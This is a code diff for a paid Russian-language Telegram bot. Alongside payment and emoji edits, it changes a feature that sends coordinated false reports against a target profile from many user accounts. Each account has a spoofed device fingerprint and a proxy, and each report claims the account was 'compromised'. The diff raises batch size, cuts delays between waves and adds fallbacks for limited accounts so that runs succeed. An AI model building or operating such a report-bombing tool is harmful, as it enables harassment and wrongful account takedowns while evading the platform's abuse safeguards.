-            [InlineKeyboardButton(text="Проверить", icon_custom_emoji_id="5429571366384842791", callback_data=f"sub:check:{inv_id}")],
-            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="sub:pm:xr")],
+            [InlineKeyboardButton(text="Оплатить", icon_custom_emoji_id="5409048419211682843", url=pay_url)],
+            [InlineKeyboardButton(text="Проверить", icon_custom_emoji_id="5231012545799666522", callback_data=f"sub:check:{inv_id}")],
+            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5416041192905265756", callback_data="sub:pm:xr")],
         ]),
     )
     await cb.answer()
@@ -9208,7 +10261,7 @@ async def sub_ct_paid(cb: CallbackQuery, state: FSMContext):
                             break
                     rows.insert(_idx, [InlineKeyboardButton(
                         text=f"Оплатить через СБП {rec.get('amount')} ₽",
-                        icon_custom_emoji_id="5258204546391351475",
+                        icon_custom_emoji_id="5409048419211682843",
                         url=_url)])
                 await cb.message.edit_reply_markup(
                     reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
@@ -9298,7 +10351,7 @@ async def menu_telemetry(cb: CallbackQuery):
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                 InlineKeyboardButton(
                     text="\u041d\u0430\u0437\u0430\u0434",
-                    icon_custom_emoji_id="5258132936401624790",
+                    icon_custom_emoji_id="5416041192905265756",
                     callback_data="back:home")]]))
     except Exception as e:
         log.warning("telemetry render failed: %s", e)
@@ -9317,13 +10370,7 @@ async def sub_ct_ok(cb: CallbackQuery, state: FSMContext):
         return
     uid = int(uid_s)
     subs = load_subs()
-    try:
-        activate_plan(subs, uid, pk)
-    except ValueError as ve:
-        if "premium_requires_base" in str(ve):
-            await cb.answer("❌ Нельзя: сначала нужна базовая подписка", show_alert=True)
-            return
-        raise
+    activate_plan(subs, uid, pk)
     pend = load_ct_pending()
     _rec_amt = float((pend.get(str(uid)) or {}).get("amount", 0))
     bump_pay_stats(uid, pk, "cloudtips", _rec_amt, "RUB")
@@ -9387,15 +10434,7 @@ async def sub_cryptobot_check(cb: CallbackQuery, state: FSMContext):
     status = (items[0].get("status") or "") if items else ""
     if status == "paid":
         subs = load_subs()
-        try:
-            activate_plan(subs, cb.from_user.id, pk)
-        except ValueError as ve:
-            if "premium_requires_base" in str(ve):
-                await cb.answer(
-                    "❌ Сначала нужна базовая подписка — потом премиум",
-                    show_alert=True)
-                return
-            raise
+        activate_plan(subs, cb.from_user.id, pk)
         s, until = sub_quality(subs, cb.from_user.id)
         await cb.answer("✅ Оплата прошла, подписка активна!", show_alert=True)
         caption = (
@@ -9405,7 +10444,7 @@ async def sub_cryptobot_check(cb: CallbackQuery, state: FSMContext):
         await cb.message.edit_caption(
             caption=_cx(caption), parse_mode=ParseMode.HTML,
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
+                [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5416041192905265756", callback_data="back:home")],
             ]))
         await push_send_log(
             "Оплата (CryptoBot)",
@@ -9434,19 +10473,10 @@ async def on_successful_payment(msg: Message):
         await msg.answer("⚠️ Платёж принят, но план не распознан — напиши админу.")
         return
     pk = plan_key(pk)
+    subs = load_subs()
     if pk in SUB_PLANS:
         subs = load_subs()
-        try:
-            activate_plan(subs, uid, pk)
-        except ValueError as ve:
-            if "premium_requires_base" in str(ve):
-                await msg.answer(
-                    _cx(bq(f"<b>{NAME}</b>  —  ⚠️ Премиум недоступен")
-                        + "\n\nСначала нужна базовая подписка. "
-                        "После её покупки премиум станет доступен."),
-                    parse_mode=ParseMode.HTML)
-                return
-            raise
+        activate_plan(subs, uid, pk)
         bump_pay_stats(uid, pk, "stars",
                        float(sp.total_amount or 0), "XTR")
         commit_file_to_repo("pay_stats.json", "pay stats: stars", cooldown=0)
@@ -9503,7 +10533,7 @@ async def sub_check(cb: CallbackQuery, state: FSMContext):
                                float(SUB_PLANS[plan_key].get("price", 0)),
                                "USDT")
             await cb.answer("\u2705 \u041e\u043f\u043b\u0430\u0442\u0430 \u043f\u0440\u043e\u0448\u043b\u0430, \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0430 \u0430\u043a\u0442\u0438\u0432\u043d\u0430!", show_alert=True)
-            s, until = sub_quality(subs, info["user"])
+            s, until = sub_quality(subs, pay_user)
             caption = (
                 bq(f"<b>{NAME}</b>  \u2014  \u041f\u043e\u0434\u043f\u0438\u0441\u043a\u0430 \u043e\u043a")
                 + f"\n\n\u2705 \u0421\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435: <b>{s}</b> ({until})\n"
@@ -9511,7 +10541,7 @@ async def sub_check(cb: CallbackQuery, state: FSMContext):
             )
             await cb.message.edit_caption(caption=_cx(caption), parse_mode=ParseMode.HTML,
                                           reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                                              [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
+                                              [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5416041192905265756", callback_data="back:home")],
                                           ]))
             return
         await cb.answer(f"\u23f3 \u0441\u0442\u0430\u0442\u0443\u0441: {status or 'unknown'}", show_alert=True)
@@ -9532,13 +10562,19 @@ _REPORT_CB_RE = re.compile(
     r"^(method:[a-z]+|reason:[a-z_]+|cmt:(auto|custom|back)|skip_comment|confirm:(yes|no))$")
 
 
+def _fsm_state_str(v) -> str:
+    s = str(v or "")
+    m = re.match(r"^<State '([^']+)'>$", s)
+    return m.group(1) if m else s
+
+
 async def _fsm_last_entry(uid: int):
     """The user's latest persisted FSM entry: repo file first, store doc second."""
     try:
         if FSM_FILE.exists():
             j = json.loads(FSM_FILE.read_text(encoding="utf-8"))
             for e in j.get("entries", []):
-                if e.get("user_id") == uid and str(e.get("state") or "").startswith("Report:"):
+                if e.get("user_id") == uid and _fsm_state_str(e.get("state")).startswith("Report:"):
                     return e
     except Exception:
         pass
@@ -9549,7 +10585,7 @@ async def _fsm_last_entry(uid: int):
             if txt:
                 j = json.loads(txt)
                 for e in j.get("entries", []):
-                    if e.get("user_id") == uid and str(e.get("state") or "").startswith("Report:"):
+                    if e.get("user_id") == uid and _fsm_state_str(e.get("state")).startswith("Report:"):
                         return e
     except Exception:
         pass
@@ -9559,7 +10595,7 @@ async def _fsm_last_entry(uid: int):
 async def _fsm_render_state(cb: CallbackQuery, e: dict) -> None:
     """Re-render the screen matching the restored state as a fresh message."""
     data = e.get("data") or {}
-    st = str(e.get("state") or "")
+    st = _fsm_state_str(e.get("state"))
     try:
         if st == "Report:comment" and data.get("target"):
             await cb.message.answer(_cx(comment_step_text(data)),
@@ -9701,167 +10737,144 @@ async def stale_cb(cb: CallbackQuery, state: FSMContext):
 
 # ── premium custom emoji (pack: t.me/addemoji/tgmacicons) ──
 _CUSTOM_EMOJI = {
-    "🚀": '5323404142809467476', "🝬": '5258254475386167466',
-    "◀": '5258132936401624790', "📡": '5258391025281408576', "🔑": '5258476306152038031',
-    '👨\u200d🎨': '5258450450448915742',
-    '👩\u200d🎨': '5258215635996908355',
-    '✈️': '5258115571848846212',
-    '⭐️': '5258165702707125574',
-    '⚽️': '5258169263235013408',
-    '⚡️': '5323404142809467476',
-    '✍️': '5258331647358540449',
-    '↔️': '5260233433107407649',
-    '➡️': '5204189706237004154',
-    '❤️': '5258179403652801593',
-    '↗️': '5257991477358763590',
-    '⬅️': '5258132936401624790',
-    '❗️': '5258474669769497337',
-    '⬇️': '5258336354642697821',
-    '☁️': '5280867942056108177',
-    '⬆️': '5258043150110301407',
-    'ℹ️': '5258503720928288433',
-    '☀️': '5258089153505009279',
-    '⛔️': '5275969776668134187',
-    '⛔': '5275969776668134187',
-    '⭐': '5258165702707125574',
-    '✈': '5258115571848846212',
-    '⚽': '5258169263235013408',
-    '✍': '5258331647358540449',
-    '↔': '5260233433107407649',
-    '➡': '5204189706237004154',
-    '↗': '5257991477358763590',
-    '⬆': '5258043150110301407',
-    '⬇': '5258336354642697821',
-    '⬅': '5258132936401624790',
-    '❗': '5258474669769497337',
-    '❤': '5258179403652801593',
-    '☀': '5258089153505009279',
-    '☁': '5280867942056108177',
-    '⚠': '5258474669769497337',
-    '🎯': '5258509201306557640',
-    '⏳': '5258258882022612173',
-    '💳': '5258204546391351475',
-    '🌐': '5258423306255604960',
-    '🔍': '5429571366384842791',
-    '🛡': '5258476306152038031',
-    '🔪': '5258278668936945760',
-    '💀': '5267123797600783095',
-    '🎁': '5298988357538328017',
-    '🔐': '5258476306152038031',
-    '🔌': '5258096772776991776',
-    '🪞': '5258254475386167466',
-    '🧷': '5258461531464539536',
-    '🟢': '5357069174512303778',
-    '❓': '5258503720928288433',
-    '🧾': '5258477770735885832',
-    '⏱': '5258258882022612173',
-    '✏': '5370546867786523009',
-    '🎨': '5258450450448915742',
-    '💸': '5258204546391351475',
-    '💢': '5258474669769497337',
-    '💊': '5323585953070074710',
-    '⏭': '5204189706237004154',
-    '⏩': '5204189706237004154',
-    '🔔': '5260325873688518261',
-    '⏰': '5258419835922030550',
-    '🛰': '5258212268742549391',
-    '📢': '5260268501515377807',
-    '👑': '5298988357538328017',
-    '📅': '5258105663359294787',
-    '📊': '5258391025281408576',
-    '👨': '5256143829672672750',
-    '👩': '5256143829672672750',
-    '🛠': '5258096772776991776',
-    '❎': '5267123797600783095',
-    '🧬': '5258486128742244085',
-    '🧝': '5258093637450866522',
-    '🎉': '5258165702707125574',
-    '💵': '5258204546391351475',
-    '🆔': '5226513232549664618',
-    '🧰': '5258096772776991776',
-    '✉': '5260268501515377807',
-    '📧': '5260268501515377807',
-    '📨': '5260268501515377807',
-    '📫': '5260268501515377807',
-    '📤': '5260268501515377807',
-    '📥': '5452165780579843515',
-    '📱': '5258020476977946656',
-    '📲': '5258020476977946656',
-    '🏦': '5258204546391351475',
-    '🔢': '5226513232549664618',
-    '🖼': '5258254475386167466',
-    '👤': '5256143829672672750',
-    '📂': '5257969839313526622',
-    '❌': '5267123797600783095',
-    '🐻': '5258145898612924124',
-    '📝': '5370546867786523009',
-    '🪙': '5258368777350816286',
-    '📖': '5258328383183396223',
-    '🤖': '5258093637450866522',
-    '💼': '5258260149037965799',
-    '🗓': '5258105663359294787',
-    '🤙': '5258337316715373336',
-    '📸': '5255813559572508065',
-    '📣': '5260268501515377807',
-    '✅': '5357069174512303778',
-    '⛓': '5260730055880876557',
-    '📄': '5258477770735885832',
-    '©': '5258507474729704350',
-    '👥': '5258486128742244085',
-    '🗑': '5258130763148172425',
-    '🎭': '5258430848218176413',
-    '📁': '5452165780579843515',
-    '🎮': '5258508428212445001',
-    '🎓': '5258334872878980409',
-    '🏘': '5257963315258204021',
-    '🚪': '5258084656674250503',
-    '💡': '5258216851472654189',
-    '📍': '5258509201306557640',
-    '🔒': '5258476306152038031',
-    '💬': '5427181942934088912',
-    '🌘': '5258011861273551368',
-    '🎵': '5258289810082111221',
-    '🔕': '5260264520080695245',
-    '🎶': '5258334469152054985',
-    '📌': '5258461531464539536',
-    '➕': '5359529383319084413',
-    '🍑': '5258330865674494479',
-    '🔫': '5258278668936945760',
-    '👏': '5258501105293205250',
-    '🔄': '5260687119092817530',
-    '🌠': '5258212268742549391',
-    '🔃': '5260687681733533075',
-    '💎': '5298988357538328017',
-    '🤚': '5260249440450520061',
-    '🗳': '5258200019495821936',
-    '🕔': '5258419835922030550',
-    '⏲': '5258258882022612173',
-    '👀': '5260341314095947411',
-    '🔼': '5260379144167890225',
-    '💻': '5258423306255604960',
-    '🙂': '5258262708838472996',
-    '🔇': '5258267368877989660',
-    '📈': '5258391025281408576',
-    '📚': '5260512129240276089',
-    '📦': '5258134813302332906',
-    '✋': '5258362429389152256',
-    '📹': '5258077307985207053',
-    '📞': '5258020476977946656',
-    '📼': '5258391252914676042',
-    '🙃': '5258318251355545562',
-    '🕘': '5199457120428249992',
-    '🎙': '5260652149469094137',
-    '💰': '5258204546391351475',
-    '⚙': '5258096772776991776',
-    '♾': '5271934788037517525',
-    '🔊': '5260325873688518261',
-    '📰': '5249231689695115145',
-    '🏷': '5296678515536581003',
-    '🔎': '5429571366384842791',
-    '👁': '5253959125838090076',
-    '🔞': '5323585953070074710',
-    '🍴': '5296727963495079440',
-    '🔖': '5359629206948976159',
+    '⚡': '5456140674028019486',
+    '⚡️': '5456140674028019486',
+    '🚀': '5456140674028019486',
+    '☄': '5224607267797606837',
+    '⛔': '5260293700088511294',
+    '⛔️': '5260293700088511294',
+    '🚫': '5240241223632954241',
+    '❗': '5274099962655816924',
+    '❗️': '5274099962655816924',
+    '‼': '5440660757194744323',
+    '⁉': '5314504236132747481',
+    '❓': '5436113877181941026',
+    '⚠': '5447644880824181073',
+    '⚠️': '5447644880824181073',
+    '🌐': '5447410659077661506',
+    '💬': '5443038326535759644',
+    '💭': '5467538555158943525',
+    '📊': '5231200819986047254',
+    '📈': '5244837092042750681',
+    '📉': '5246762912428603768',
+    '✔': '5206607081334906820',
+    '✅': '5206607081334906820',
+    '❌': '5210952531676504517',
+    '🔔': '5458603043203327669',
+    '🔕': '5458603043203327669',
+    '📣': '5424818078833715060',
+    '🗣': '5460795800101594035',
+    '🔍': '5231012545799666522',
+    '🔎': '5231012545799666522',
+    '🛡': '5251203410396458957',
+    '🔗': '5271604874419647061',
+    '💻': '5282843764451195532',
+    '🖥': '5282843764451195532',
+    '©': '5323442290708985472',
+    'ℹ': '5334544901428229844',
+    'ℹ️': '5334544901428229844',
+    '👍': '5337080053119336309',
+    '❤': '5337080053119336309',
+    '❤️': '5337080053119336309',
+    '💕': '5337080053119336309',
+    '⏸': '5359543311897998264',
+    '💯': '5341498088408234504',
+    '🔄': '5375338737028841420',
+    '🔝': '5415655814079723871',
+    '⬆': '5415655814079723871',
+    '⬆️': '5415655814079723871',
+    '⬇': '5406745015365943482',
+    '⬇️': '5406745015365943482',
+    '🆕': '5382357040008021292',
+    '🔜': '5440621591387980068',
+    '⏳': '5386367538735104399',
+    '⌛': '5440621591387980068',
+    '🕐': '5440621591387980068',
+    '🕒': '5440621591387980068',
+    '📍': '5391032818111363540',
+    '🗺': '5391032818111363540',
+    '➕': '5397916757333654639',
+    '➡': '5416117059207572332',
+    '➡️': '5416117059207572332',
+    '▶': '5264919878082509254',
+    '🔴': '5411225014148014586',
+    '🟢': '5416081784641168838',
+    '🔥': '5424972470023104089',
+    '💥': '5276032951342088188',
+    '💰': '5409048419211682843',
+    '💵': '5409048419211682843',
+    '💲': '5409048419211682843',
+    '💸': '5233326571099534068',
+    '💶': '5233326571099534068',
+    '💷': '5290017777174722330',
+    '💱': '5402186569006210455',
+    '🎙': '5294339927318739359',
+    '🎤': '5294339927318739359',
+    '🤫': '5431609822288033666',
+    '👎': '5449875686837726134',
+    '👀': '5210956306952758910',
+    '🙂': '5461117441612462242',
+    '🙃': '5461117441612462242',
+    '📎': '5305265301917549162',
+    '🖇': '5305265301917549162',
+    '⚙': '5341715473882955310',
+    '⚙️': '5341715473882955310',
+    '🔧': '5341715473882955310',
+    '🔒': '5296369303661067030',
+    '🔓': '5296369303661067030',
+    '🔐': '5296369303661067030',
+    '🎮': '5361741454685256344',
+    '🔈': '5388632425314140043',
+    '🔊': '5388632425314140043',
+    '☀': '5402477260982731644',
+    '☀️': '5402477260982731644',
+    '☁': '5399913388845322366',
+    '☁️': '5399913388845322366',
+    '🌙': '5449569374065152798',
+    '❄': '5449449325434266744',
+    '🌈': '5409109841538994759',
+    '🗓': '5413879192267805083',
+    '📅': '5413879192267805083',
+    '💡': '5422439311196834318',
+    '🥇': '5440539497383087970',
+    '🥈': '5447203607294265305',
+    '🥉': '5453902265922376865',
+    '🎵': '5463107823946717464',
+    '🎶': '5463107823946717464',
+    '🆓': '5406756500108501710',
+    '✏': '5395444784611480792',
+    '✏️': '5395444784611480792',
+    '📝': '5395444784611480792',
+    '🚨': '5395695537687123235',
+    '🏠': '5416041192905265756',
+    '🚩': '5460755126761312667',
+    '🎉': '5461151367559141950',
+    '🎊': '5461151367559141950',
+    '💎': '5427168083074628963',
+    '⭐': '5438496463044752972',
+    '⭐️': '5438496463044752972',
+    '🌟': '5438496463044752972',
+    '✨': '5325547803936572038',
+    '👑': '5217822164362739968',
+    '🗑': '5445267414562389170',
+    '🔖': '5222444124698853913',
+    '📕': '5222444124698853913',
+    '📖': '5222444124698853913',
+    '📚': '5222444124698853913',
+    '✉': '5253742260054409879',
+    '✉️': '5253742260054409879',
+    '📩': '5253742260054409879',
+    '🛍': '5229064374403998351',
+    '🕯': '5451882707875276247',
+    '🆒': '5222079954421818267',
+    '🥸': '5391112412445288650',
+    '🤡': '5269531045165816230',
+    '📌': '5397782960512444700',
+    '🇷🇺': '5231449120635370684',
+    '🖊': '5395444784611480792',
+    '👤': '5461117441612462242',
+    '👥': '5461117441612462242',
+    '📱': '5443038326535759644',
 }
 
 def _cx(text: str) -> str:
@@ -9882,7 +10895,7 @@ def _cx(text: str) -> str:
                    "".join(parts))
 
 
-MAINTENANCE_ADMIN_IDS: set[int] = _ADMIN_IDS
+MAINTENANCE_ADMIN_IDS = {int(ADMIN_ID)} if ADMIN_ID.isdigit() else set()
 
 
 def _make_maintenance_gate():
@@ -9948,7 +10961,7 @@ class PersistStorage(MemoryStorage):
                     "thread_id": getattr(k, "thread_id", 0) or 0,
                     "biz": getattr(k, "business_connection_id", None) or "",
                     "destiny": getattr(k, "destiny", "default") or "default",
-                    "state": st,
+                    "state": getattr(st, "state", st) if st is not None else None,
                     "data": dat,
                 })
             text = json.dumps({"v": 1, "entries": entries},
@@ -10335,7 +11348,7 @@ async def star_tx_grant_loop():
 # sessions ride our fingerprints, sticky proxies, locks and ledger rationing.
 PROFILE_REPORT_TEXT = ("My account has been compromised. Please terminate "
                        "all active sessions immediately to protect my data.")
-PROFILE_BATCH = 3
+PROFILE_BATCH = 10
 
 
 async def _profile_find_option(client, peer, keyword_ru: str,
@@ -10356,15 +11369,30 @@ async def _profile_find_option(client, peer, keyword_ru: str,
         return None
 
 
-async def _profile_options(client, target: str):
-    """Scout the category tree once; returns (other_opt, misc_opt)."""
-    entity = await client.get_entity(target)
-    peer = await client.get_input_entity(entity)
+async def _peer_for(client, target: str,
+                    fallback: tuple[int, int] | None = None):
+    """Resolve the target; if this account cannot resolve usernames
+    (limited account returns USERNAME_NOT_OCCUPIED), fall back to the
+    id/access_hash pair scouted by another session."""
+    try:
+        entity = await client.get_entity(target)
+        return await client.get_input_entity(entity), (entity.id,
+                                                       entity.access_hash)
+    except Exception:
+        if fallback:
+            return InputPeerUser(fallback[0], fallback[1]), fallback
+        raise
+
+
+async def _profile_options(client, target: str,
+                           fallback: tuple[int, int] | None = None):
+    """Scout the category tree once; returns (other, misc, entity_ref)."""
+    peer, ref = await _peer_for(client, target, fallback)
     other = await _profile_find_option(client, peer, "другое", "other")
     if other is None:
-        return None, None
+        return None, None, ref
     misc = await _profile_find_option(client, peer, "прочее", "misc", other)
-    return other, misc
+    return other, misc, ref
 
 
 async def fire_profile_reports(target: str, comment: str = "") -> dict:
@@ -10387,26 +11415,33 @@ async def fire_profile_reports(target: str, comment: str = "") -> dict:
         await push_send_log("Report (профиль)", ["❌ нет доступных сессий"])
         return results
 
-    # one scout on a usable session — options are the same for all sessions
-    scout = pool[0]
+    # scout the option tree on up to 3 sessions: one limited account that
+    # cannot resolve usernames must not kill the whole run
     other = misc = None
-    try:
-        async with _session_lock(scout):
-            fp = session_fingerprint(scout.stem)
-            client = TelegramClient(
-                str(scout.with_suffix("")), fp["api_id"], fp["api_hash"],
-                proxy=pin_for_session(scout.stem, proxies),
-                device_model=fp["device"], system_version=fp["system_version"],
-                app_version=fp["app_version"], lang_code=fp["lang_code"])
-            try:
-                await _connect_safe(client)
-                if not await client.is_user_authorized():
-                    raise RuntimeError("scout not authorized")
-                other, misc = await _profile_options(client, target)
-            finally:
-                await client.disconnect()
-    except Exception as e:
-        log.warning("profile scout failed: %s", e)
+    entity_ref = None
+    for scout in pool[:3]:
+        try:
+            async with _session_lock(scout):
+                fp = session_fingerprint(scout.stem)
+                client = TelegramClient(
+                    str(scout.with_suffix("")), fp["api_id"], fp["api_hash"],
+                    proxy=pin_for_session(scout.stem, proxies),
+                    device_model=fp["device"],
+                    system_version=fp["system_version"],
+                    app_version=fp["app_version"], lang_code=fp["lang_code"])
+                try:
+                    await _connect_safe(client)
+                    if not await client.is_user_authorized():
+                        raise RuntimeError("scout not authorized")
+                    other, misc, entity_ref = await _profile_options(client,
+                                                                     target)
+                finally:
+                    await client.disconnect()
+        except Exception as e:
+            log.warning("profile scout failed on %s: %s", scout.stem, e)
+            continue
+        if other is not None:
+            break
     if other is None:
         await push_send_log("Report (профиль)", [
             f"🎯 <code>{html_mod.escape(str(target))}</code>",
@@ -10431,8 +11466,7 @@ async def fire_profile_reports(target: str, comment: str = "") -> dict:
                     await _connect_safe(client)
                     if not await client.is_user_authorized():
                         return name, px, False, "not authorized"
-                    entity = await client.get_entity(target)
-                    peer = await client.get_input_entity(entity)
+                    peer, _ref = await _peer_for(client, target, entity_ref)
                     await client(ReportRequest(
                         peer=peer, id=[], option=b'', message=''))
                     await client(ReportRequest(
@@ -10462,7 +11496,7 @@ async def fire_profile_reports(target: str, comment: str = "") -> dict:
     for i in range(0, len(pool), PROFILE_BATCH):
         outs += await asyncio.gather(*[one(s) for s in pool[i:i + PROFILE_BATCH]])
         if i + PROFILE_BATCH < len(pool):
-            await asyncio.sleep(random.uniform(2, 4))
+            await asyncio.sleep(random.uniform(0.5, 1.0))
 
     real_rows = []
     for name, px, ok, err in outs:
@@ -10554,9 +11588,17 @@ async def main():
             # canonical data store: users/subs restored from Telegram
             store.init(bot, BOT_TOKEN)
             await store.bootstrap({"users": USERS_FILE, "subs": SUBS_FILE})
-            if not globals().get("_db_rec_started"):
-                globals()["_db_rec_started"] = True
-                asyncio.create_task(db_reconcile_loop())
+            # reconcile grants that died between activate_plan and the push
+            if not globals().get("_subs_audit_done"):
+                globals()["_subs_audit_done"] = True
+                try:
+                    _fx = await subs_audit(repair=True)
+                    if _fx:
+                        log.info("subs audit on boot: %d fixes", len(_fx))
+                        asyncio.create_task(
+                            push_send_log("Аудит подписок", _fx[:40]))
+                except Exception as e:
+                    log.warning("subs audit on boot: %s", e)
             if not globals().get("_ct_poller_started"):
                 globals()["_ct_poller_started"] = True
                 asyncio.create_task(ct_poller_loop(bot))
